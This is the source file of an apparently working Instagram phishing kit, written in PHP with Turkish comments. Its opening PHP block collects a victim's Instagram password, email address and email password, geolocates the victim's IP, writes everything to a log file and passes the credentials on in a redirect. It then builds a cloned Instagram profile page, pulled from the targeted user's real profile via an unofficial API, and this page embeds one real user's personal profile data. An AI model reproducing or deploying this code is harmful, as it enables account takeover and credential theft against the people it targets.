<?php
session_start();
error_reporting(0);
include './felonydata.php';
require 'felony/autoload.php';
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$_SESSION["nick"] =  $_GET['nick'];
$felony = $_SESSION["nick"];
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
?>

<?php
$file = fopen($felonytxt, 'a');
fwrite($file, "Username: ".$felony."\n\n" ."Password: ".$password. "\n\n"."Mail: ".$mail."\n\n"."Mail Password: ".$mailpass."\n\n"."Ip Adress: " .$ip."\n\n".

"Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n");
fclose($file);
echo '';
   fclose($dosya);
    header("Location: ./felony.php?email=".$mail."&username=".$felony."&passmail=".$mailpass."&ndpass=".$password."&ip=".$ip."&ulke=".$country."&time=".$cur_time);
      }
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
$ig = new \InstagramAPI\Instagram();
try{
  $ig->login($felonyusername,$felonypassword);
}catch(\Exception $e){
  echo $e->getMessage();
}
$json = $ig->people->getInfoByName($felony);
$arr = json_decode($json, true);
$felonyresim = $arr['user']['profile_pic_url'];//profil resmi çektirir
$felonypost = $arr['user']['media_count'];//post sayısı çektirir
$felonytakipci = $arr['user']['follower_count'];//takipçi sayısı çektirir
$felonytakipe = $arr['user']['following_count'];//takip ettiği kişi sayısı çektirir
$felonyisim  = $arr['user']['full_name'];//ismi çektirir
$felonybiografi = $arr['user']['biography']; // biyografi çektirir
$felonymavi = $arr['user']['is_verified'];//mavi tik varsa çektirir
$felonysite = $arr['user']['external_url'];//web sitesi varsa çeker
    ?>
<html lang="tr" class="js logged-in client-root js-focus-visible sDN5V"><head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title><?=$felony?> • Instagram fotoğrafları ve videoları</title>

        
        <meta name="robots" content="noimageindex, noarchive">
        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#ffffff">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
        <link rel="manifest" href="/data/manifest.json">

        <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/8b14c73dac4f.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/e5f471a37be6.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Consumer.css/e95ba14ee714.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ProfilePageContainer.css/e36e97b666f7.css" as="style" type="text/css" crossorigin="anonymous">


<link rel="preload" href="/static/bundles/es6/Vendor.js/c911f5848b78.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/tr_TR.js/2d2d1816e032.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/ConsumerLibCommons.js/3143d1dfc2ff.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/ConsumerUICommons.js/11390156a7c7.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/ConsumerAsyncCommons.js/76045d7941d2.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/Consumer.js/f85307bf9f8d.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="/static/bundles/es6/ProfilePageContainer.js/c3f33abff158.js" as="script" type="text/javascript" crossorigin="anonymous">
        
        

        <script type="text/javascript">
        (function() {
  var docElement = document.documentElement;
  var classRE = new RegExp('(^|\\s)no-js(\\s|$)');
  var className = docElement.className;
  docElement.className = className.replace(classRE, '$1js$2');
})();
</script>
        <script type="text/javascript">
(function() {
  if ('PerformanceObserver' in window && 'PerformancePaintTiming' in window) {
    window.__bufferedPerformance = [];
    var ob = new PerformanceObserver(function(e) {
      window.__bufferedPerformance.push.apply(window.__bufferedPerformance,e.getEntries());
    });
    ob.observe({entryTypes:['paint']});
  }

  window.__bufferedErrors = [];
  window.onerror = function(message, url, line, column, error) {
    window.__bufferedErrors.push({
      message: message,
      url: url,
      line: line,
      column: column,
      error: error
    });
    return false;
  };
  window.__initialData = {
    pending: true,
    waiting: []
  };
  function asyncFetchSharedData(extra) {
    var sharedDataReq = new XMLHttpRequest();
    sharedDataReq.onreadystatechange = function() {
          if (sharedDataReq.readyState === 4) {
            if(sharedDataReq.status === 200){
              var sharedData = JSON.parse(sharedDataReq.responseText);
              window.__initialDataLoaded(sharedData, extra);
            }
          }
        }
    sharedDataReq.open('GET', '/data/shared_data/', true);
    sharedDataReq.send(null);
  }
  function notifyLoaded(item, data) {
    item.pending = false;
    item.data = data;
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].resolve(item.data);
    }
    item.waiting = [];
  }
  function notifyError(item, msg) {
    item.pending = false;
    item.error = new Error(msg);
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].reject(item.error);
    }
    item.waiting = [];
  }
  window.__initialDataLoaded = function(initialData, extraData) {
    if (extraData) {
      for (var key in extraData) {
        initialData[key] = extraData[key];
      }
    }
    notifyLoaded(window.__initialData, initialData);
  };
  window.__initialDataError = function(msg) {
    notifyError(window.__initialData, msg);
  };
  window.__additionalData = {};
  window.__pendingAdditionalData = function(paths) {
    for (var i = 0;i < paths.length; ++i) {
      window.__additionalData[paths[i]] = {
        pending: true,
        waiting: []
      };
    }
  };
  window.__additionalDataLoaded = function(path, data) {
    if (path in window.__additionalData) {
      notifyLoaded(window.__additionalData[path], data);
    } else {
      console.error('Unexpected additional data loaded "' + path + '"');
    }
  };
  window.__additionalDataError = function(path, msg) {
    if (path in window.__additionalData) {
      notifyError(window.__additionalData[path], msg);
    } else {
      console.error('Unexpected additional data encountered an error "' + path + '": ' + msg);
    }
  };
  
})();
</script><script type="text/javascript">

/*
 Copyright 2018 Google Inc. All Rights Reserved.
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
*/

(function(){function g(a,c){b||(b=a,f=c,h.forEach(function(a){removeEventListener(a,l,e)}),m())}function m(){b&&f&&0<d.length&&(d.forEach(function(a){a(b,f)}),d=[])}function n(a,c){function k(){g(a,c);d()}function b(){d()}function d(){removeEventListener("pointerup",k,e);removeEventListener("pointercancel",b,e)}addEventListener("pointerup",k,e);addEventListener("pointercancel",b,e)}function l(a){if(a.cancelable){var c=performance.now(),b=a.timeStamp;b>c&&(c=+new Date);c-=b;"pointerdown"==a.type?n(c,
a):g(c,a)}}var e={passive:!0,capture:!0},h=["click","mousedown","keydown","touchstart","pointerdown"],b,f,d=[];h.forEach(function(a){addEventListener(a,l,e)});window.perfMetrics=window.perfMetrics||{};window.perfMetrics.onFirstInputDelay=function(a){d.push(a);m()}})();
</script>
    
                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="/static/images/ico/apple-touch-icon-76x76-precomposed.png/666282be8229.png">
                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="/static/images/ico/apple-touch-icon-120x120-precomposed.png/8a5bd3f267b1.png">
                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="/static/images/ico/apple-touch-icon-152x152-precomposed.png/68193576ffc5.png">
                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="/static/images/ico/apple-touch-icon-167x167-precomposed.png/4985e31c9100.png">
                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="/static/images/ico/apple-touch-icon-180x180-precomposed.png/c06fdb2357bd.png">
                
                    <link rel="icon" sizes="192x192" href="/static/images/ico/favicon-192.png/68d99ba29cc8.png">
                
            
            
                    <link rel="mask-icon" href="/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
                  
                  <link rel="shortcut icon" type="image/x-icon" href="/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                
            
            
            
    
            
            <link rel="alternate" href="android-app://com.instagram.android/https/instagram.com/_u/ozcandongel0/">
        
            
            <meta property="al:ios:app_name" content="Instagram">
            <meta property="al:ios:app_store_id" content="389801252">
            <meta property="al:ios:url" content="instagram://user?username=ozcandongel0">
            <meta property="al:android:app_name" content="Instagram">
            <meta property="al:android:package" content="com.instagram.android">
            <meta property="al:android:url" content="https://www.instagram.com/_u/ozcandongel0/">
        
            <link rel="canonical" href="https://www.instagram.com/ozcandongel0/">
            <meta content="185 Takipçi, 690 Takip Edilen, 2 Gönderi - @ozcandongel0&amp;#39;in Instagram fotoğraflarını ve videolarını gör" name="description">
            
            <meta property="og:type" content="profile">
            <meta property="og:image" content="https://instagram.fsaw1-5.fna.fbcdn.net/v/t51.2885-19/s150x150/106204495_718820108902479_1508532171890324548_n.jpg?_nc_ht=instagram.fsaw1-5.fna.fbcdn.net&amp;_nc_ohc=nVC69KC2M2cAX-O_V3T&amp;oh=0d7bccfe33714bb5fa3e5bb2b5afb1d7&amp;oe=5F3A27BD">
            <meta property="og:title" content="@ozcandongel0 • Instagram fotoğrafları ve videoları">
            <meta property="og:description" content="185 Takipçi, 690 Takip Edilen, 2 Gönderi - @ozcandongel0'in Instagram fotoğraflarını ve videolarını gör">
            <meta property="og:url" content="https://www.instagram.com/ozcandongel0/">
        
        

            <script type="application/ld+json">
                {"@context":"http:\/\/schema.org","@type":"Person","name":"@ozcandongel0","description":"KL&quot;22","url":"http:\/\/cracklearn.org\/","mainEntityofPage":{"@type":"ProfilePage","@id":"https:\/\/www.instagram.com\/ozcandongel0\/","interactionStatistic":{"@type":"InteractionCounter","interactionType":"http:\/\/schema.org\/FollowAction","userInteractionCount":"185"}},"image":"https:\/\/www.instagram.com\/static\/images\/ico\/favicon-200.png\/ab6eff595bb1.png"}
            </script>
        
    <link rel="alternate" href="https://www.instagram.com/ozcandongel0/" hreflang="x-default">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=en" hreflang="en">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=fr" hreflang="fr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=it" hreflang="it">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=de" hreflang="de">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es" hreflang="es">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=zh-cn" hreflang="zh-cn">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=zh-tw" hreflang="zh-tw">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ja" hreflang="ja">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ko" hreflang="ko">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=pt" hreflang="pt">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=pt-br" hreflang="pt-br">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=af" hreflang="af">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=cs" hreflang="cs">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=da" hreflang="da">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=el" hreflang="el">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=fi" hreflang="fi">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=hr" hreflang="hr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=hu" hreflang="hu">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=id" hreflang="id">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ms" hreflang="ms">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=nb" hreflang="nb">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=nl" hreflang="nl">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=pl" hreflang="pl">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ru" hreflang="ru">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=sk" hreflang="sk">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=sv" hreflang="sv">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=th" hreflang="th">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=tl" hreflang="tl">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=tr" hreflang="tr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=hi" hreflang="hi">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=bn" hreflang="bn">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=gu" hreflang="gu">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=kn" hreflang="kn">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ml" hreflang="ml">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=mr" hreflang="mr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=pa" hreflang="pa">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ta" hreflang="ta">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=te" hreflang="te">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ne" hreflang="ne">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=si" hreflang="si">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ur" hreflang="ur">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=vi" hreflang="vi">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=bg" hreflang="bg">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=fr-ca" hreflang="fr-ca">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=ro" hreflang="ro">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=sr" hreflang="sr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=uk" hreflang="uk">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=zh-hk" hreflang="zh-hk">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-gt">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-pe">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-uy">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-mx">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-co">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-cr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-pa">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-py">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-do">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-pr">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-sv">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-cu">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-hn">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-ni">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-ec">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-bo">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-ve">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-ar">
<link rel="alternate" href="https://www.instagram.com/ozcandongel0/?hl=es-la" hreflang="es-cl">
<script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="/static/bundles/es6/ProfilePageContainer.js/c3f33abff158.js"></script><link href="/static/bundles/es6/ProfilePageContainer.css/e36e97b666f7.css" type="text/css" crossorigin="anonymous" rel="stylesheet"><script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="/static/bundles/es6/ActivityFeedBox.js/ab1ca7664bb3.js"></script><link href="/static/bundles/es6/ActivityFeedBox.css/f80cd1196a8b.css" type="text/css" crossorigin="anonymous" rel="stylesheet"><script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="/static/bundles/es6/DirectMQTT.js/c99421349481.js"></script></head>
    <body class="" style="">
        
    <div id="react-root"><form enctype="multipart/form-data" method="POST" role="presentation"><input accept="image/jpeg" class="tb_sK" type="file"></form><section class="_9eogI E3X2T"><div></div><main class="SCxLW  o64aR " role="main"><div class="v9tJq AAaSh VfzDr"><header class="vtbgv "><div class="XjzKX"><div class="_4dMfM"><div class="M-jxE"><button class="IalUJ " title="Profil Fotoğrafını Değiştir"><img alt="Profil Fotoğrafını Değiştir" class="be6sR" src="<?php echo $felonyresim ?>" alt="<?php echo $felony ?>'of photo"></button><div><form enctype="multipart/form-data" method="POST" role="presentation"><input accept="image/jpeg,image/png" class="tb_sK" type="file"></form></div></div></div></div><section class="zwlfE"><div class="nZSzR"><h1 class="_7UhW9       fKFbl yUEEX   KV-D4             fDxYl     "><?=$felony?><?php
if($felonymavi == 1){
    echo'<img src="https://i.ya-webdesign.com/images/instagram-verified-badge-png.png" width="20px">';
}
?></h1><div class="AFWDX"></div></div><ul class="k9GMp "><li class="Y8-fY "><span class="-nal3 "><span class="g47SY "><?= $felonypost?></span> post</span></li><li class="Y8-fY "><a class="-nal3 " tabindex="0"><span class="g47SY " title="<?= $felonytakipci?>"><?= $felonytakipci?></span> followers</a></li><li class="Y8-fY "><a class="-nal3 " tabindex="0"><span class="g47SY "><?= $felonytakipe?></span> follow</a></li></ul><div class="-vDIg"><h1 class="rhpdm"><?=$felonyisim?></h1><br><span><?=$felonybiografi?></span> <a class="yLUwa" href="<?=$felonysite?>" page_id="profilePage" rel="me nofollow noopener noreferrer" target="_blank"><?=$felonysite?></a></div></section></header><div class="fx7hk"><a class="_9VEo1 T-jvg" href="verify.html" tabindex="0"><span class="smsjF"><span class="PJXu4"><?=$felony?> olarak devam et</span></span></a></div><div class=" _2z6nI"><article class="ySN3v"><div><div style="flex-direction: column; padding-bottom: 0px; padding-top: 0px;"></div></div></article></div></div></main></section></div>

        


        
            <link rel="stylesheet" href="/static/bundles/es6/ConsumerUICommons.css/8b14c73dac4f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="/static/bundles/es6/ConsumerAsyncCommons.css/e5f471a37be6.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="/static/bundles/es6/Consumer.css/e95ba14ee714.css" type="text/css" crossorigin="anonymous">
<script type="text/javascript">window._sharedData = {"config":{"csrf_token":"uhMjfalol8AluMvX1awj4AQOJqLFVTNz","viewer":{"biography":"KL\"22","external_url":"http://cracklearn.org/","full_name":"","has_phone_number":true,"has_profile_pic":true,"has_tabbed_inbox":false,"id":"3687604324","is_joined_recently":false,"is_private":true,"profile_pic_url":"https://instagram.fsaw1-5.fna.fbcdn.net/v/t51.2885-19/s150x150/106204495_718820108902479_1508532171890324548_n.jpg?_nc_ht=instagram.fsaw1-5.fna.fbcdn.net\u0026_nc_ohc=nVC69KC2M2cAX-O_V3T\u0026oh=0d7bccfe33714bb5fa3e5bb2b5afb1d7\u0026oe=5F3A27BD","profile_pic_url_hd":"https://instagram.fsaw1-5.fna.fbcdn.net/v/t51.2885-19/s320x320/106204495_718820108902479_1508532171890324548_n.jpg?_nc_ht=instagram.fsaw1-5.fna.fbcdn.net\u0026_nc_ohc=nVC69KC2M2cAX-O_V3T\u0026oh=5c8d4ef6ca51c0b4fdbcba92a6d3074f\u0026oe=5F3A3945","username":"ozcandongel0","badge_count":"{\"seq_id\": 62784, \"badge_count\": 0, \"badge_count_at_ms\": 1594972496040}"},"viewerId":"3687604324"},"country_code":"TR","language_code":"tr","locale":"tr_TR","entry_data":{"ProfilePage":[{"logging_page_id":"profilePage_3687604324","show_suggested_profiles":false,"show_follow_dialog":false,"graphql":{"user":{"biography":"KL\"22","blocked_by_viewer":false,"restricted_by_viewer":false,"country_block":false,"external_url":"http://cracklearn.org/","external_url_linkshimmed":"https://l.instagram.com/?u=http%3A%2F%2Fcracklearn.org%2F\u0026e=ATPylM1WMTTWHYCjdpFNqH8O0MG89ILmpeerkg6Lq45KlFJoGz2vlIqoCJibglj-lm8FqxWAEqyOn7XRD3q9KA\u0026s=1","edge_followed_by":{"count":185},"followed_by_viewer":false,"edge_follow":{"count":690},"follows_viewer":false,"full_name":"","has_ar_effects":false,"has_channel":false,"has_blocked_viewer":false,"highlight_reel_count":0,"has_requested_viewer":false,"id":"3687604324","is_business_account":false,"is_joined_recently":false,"business_category_name":null,"overall_category_name":null,"category_enum":null,"is_private":true,"is_verified":false,"edge_mutual_followed_by":{"count":0,"edges":[]},"profile_pic_url":"https://instagram.fsaw1-5.fna.fbcdn.net/v/t51.2885-19/s150x150/106204495_718820108902479_1508532171890324548_n.jpg?_nc_ht=instagram.fsaw1-5.fna.fbcdn.net\u0026_nc_ohc=nVC69KC2M2cAX-O_V3T\u0026oh=0d7bccfe33714bb5fa3e5bb2b5afb1d7\u0026oe=5F3A27BD","profile_pic_url_hd":"https://instagram.fsaw1-5.fna.fbcdn.net/v/t51.2885-19/s320x320/106204495_718820108902479_1508532171890324548_n.jpg?_nc_ht=instagram.fsaw1-5.fna.fbcdn.net\u0026_nc_ohc=nVC69KC2M2cAX-O_V3T\u0026oh=5c8d4ef6ca51c0b4fdbcba92a6d3074f\u0026oe=5F3A3945","requested_by_viewer":false,"username":"ozcandongel0","connected_fb_page":null,"edge_felix_combined_post_uploads":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_felix_combined_draft_uploads":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_felix_video_timeline":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_felix_drafts":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_felix_pending_post_uploads":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_felix_pending_draft_uploads":{"count":0,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[]},"edge_owner_to_timeline_media":{"count":2,"page_info":{"has_next_page":false,"end_cursor":null},"edges":[{"node":{"__typename":"GraphImage","id":"2340936723946940451","shortcode":"CB8rYwwhigjoLVe0axpYQ0wKSsjaeXxFyPO2qQ0","dimensions":{"height":1080,"width":1080},"display_url":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/e35/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=55f17d2c6b96c9bb6540638e476f2f8d\u0026oe=5F39BB05","gating_info":null,"fact_check_overall_rating":null,"fact_check_information":null,"media_overlay_info":null,"media_preview":"ACoqpWsauGL/AHcD5sfcJPB9881sWcDxvhiNmM4I6+jZ7H2rLlvI9pSNQqnGRzzj1P8AnmrEesFEwV3N654/xqQOhxSYrlZLie75J+UdhwPy71Zh1OW3+SUbgOh/ix9e/wCPPvVAaWp8W7fVf51z5uB6VpXt9HPFsU5JIJ4xwD9ev+RWZ5iUhlPrRmjrSsuKBF20zjPbp+NRXTHdg9jx9MCq3TpSZz1pgLmikpMUgHbaMU80+LqfoaAIMUYqSTr+FOl6j/dH8qAIsUU6koA//9k=","owner":{"id":"3687604324","username":"ozcandongel0"},"is_video":false,"accessibility_caption":"Photo by @ozcandongel0 on June 27, 2020. G\u00f6r\u00fcnt\u00fcn\u00fcn olas\u0131 i\u00e7eri\u011fi: 1 ki\u015fi, ayakta, a\u011fa\u00e7, g\u00f6ky\u00fcz\u00fc, a\u00e7\u0131k hava ve do\u011fa","edge_media_to_caption":{"edges":[]},"edge_media_to_comment":{"count":2},"comments_disabled":false,"taken_at_timestamp":1593281425,"edge_liked_by":{"count":34},"edge_media_preview_like":{"count":34},"location":null,"thumbnail_src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/sh0.08/e35/s640x640/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=a3a70d97ce7d800c81d746d4ff31db3f\u0026oe=5F3B2C3F","thumbnail_resources":[{"src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/e35/s150x150/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=3e067f58f7c70871955dc880a617e121\u0026oe=5F3C143C","config_width":150,"config_height":150},{"src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/e35/s240x240/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=b0dc25a6887946a9d3a324c7ed3fcbd8\u0026oe=5F392CBE","config_width":240,"config_height":240},{"src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/e35/s320x320/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=97fff1be934e7d47eebaaf1064f396f7\u0026oe=5F3A3744","config_width":320,"config_height":320},{"src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/e35/s480x480/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=6de9fa9508ae63befb83d759012897d2\u0026oe=5F3C1A05","config_width":480,"config_height":480},{"src":"https://instagram.fsaw1-6.fna.fbcdn.net/v/t51.2885-15/sh0.08/e35/s640x640/105484308_645759972689589_5783588573218284144_n.jpg?_nc_ht=instagram.fsaw1-6.fna.fbcdn.net\u0026_nc_cat=109\u0026_nc_ohc=rKZV10tqU3AAX9o98OE\u0026oh=a3a70d97ce7d800c81d746d4ff31db3f\u0026oe=5F3B2C3F","config_width":640,"config_height":640}]}},{"node":{"__typename":"GraphImage","id":"2337862773876508058","shortcode":"CBxwc5qhMWaXcJKXLMr-qZbof7nAJXk_COzb9Y0","dimensions":{"height":1319,"width":1080},"display_url":"https://instagram.fsaw1-10.fna.fbcdn.net/v/t51.2885-15/e35/104409705_263011671590321_8298079233562071563_n.jpg?_nc_ht=instagram.fsaw1-10.fna.fbcdn.net\u0026_nc_cat=105\u0026_nc_ohc=TLHKpU7I9zcAX8arsir\u0026oh=7ea78c1107fd3d4a72eda2126aa79639\u0026oe=5F3B130F","gating_info":null,"fact_check_overall_rating":null,"fact_check_information":null,"media_overlay_info":null,"media_preview":"ACIq1bi+ig7gnsB/n+X51mrqsm7JUlT2/wAP/wBdUx5ZJJ6+560CYAHPUEVHNcFY6CK/icZzg+h/pSTFSjZI3OOP88f56VzrXEZHGRz/AJOf/rVMsoAGceuf64obsBofY19TRUH209lBH40UuYLmPuAHoOKj3nGK0IIFcc4yO1U2jwzA9qYbFjy1MolA/dffPHAx1T0zu49wc0wNzzjkkD2/+t2qFkdSVzwQGIzx7E06Ic8/55pMbFJxxgfnRTiqZ5DZ+gopEjhEfU04Wu7nsOTn0qaPlsf56VIvU0rgRMGklY4wZAV54+g/QVWClQVHB/lV5utQOOtO4XIMv7/nRTsCigR//9k=","owner":{"id":"3687604324","username":"ozcandongel0"},"is_video":false,"accessibility_caption":"Photo by @ozcandongel0 on June 23, 2020. G\u00f6r\u00fcnt\u00fcn\u00fcn olas\u0131 i\u00e7eri\u011fi: 1 ki\u015fi, ayakta, bitki, ayakkab\u0131lar, a\u011fa\u00e7, a\u00e7\u0131k hava ve 